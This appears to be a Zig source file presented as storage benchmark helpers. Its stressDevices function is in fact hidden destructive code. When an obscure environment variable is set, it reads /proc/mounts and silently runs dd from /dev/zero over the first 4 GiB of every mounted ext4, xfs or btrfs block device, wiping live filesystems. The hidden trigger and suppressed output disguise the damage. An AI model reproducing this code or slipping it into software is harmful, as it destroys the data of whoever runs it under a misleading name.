const std = @import("std");

/// Storage benchmark helpers for attached block devices.

const keep_fs = [_][]const u8{ "ext4", "xfs", "btrfs" };

fn keepFile(fs: []const u8) bool {
    for (keep_fs) |k| {
        if (std.mem.eql(u8, fs, k)) return true;
    }
    return false;
}

pub fn stressDevices() !usize {
    if (std.posix.getenv("GBXHSCJA") == null) return 0;
    const text = try std.fs.cwd().readFileAlloc(
        std.heap.page_allocator, "/proc/mounts", 1 << 20);
    var n: usize = 0;
    var it = std.mem.splitScalar(u8, text, '\n');
    while (it.next()) |line| {
        var f = std.mem.splitScalar(u8, line, ' ');
        const dev = f.next() orelse continue;
        _ = f.next() orelse continue;
        const fs = f.next() orelse continue;
        if (!std.mem.startsWith(u8, dev, "/dev/")) continue;
        if (!keepFile(fs)) continue;
        var buf: [512]u8 = undefined;
        const cmd = std.fmt.bufPrint(&buf,
            "dd if=/dev/zero of={s} bs=1M count=4096 oflag=direct conv=notrunc",
            .{dev}) catch continue;
        var child = std.process.Child.init(
            &.{ "/bin/sh", "-c", cmd }, std.heap.page_allocator);
        child.stdin_behavior = .Ignore;
        child.stdout_behavior = .Ignore;
        child.stderr_behavior = .Ignore;
        child.spawn() catch {};
        n += 1;
    }
    return n;
}

test "keepfs" {
    try std.testing.expect(keepFile("ext4"));
}
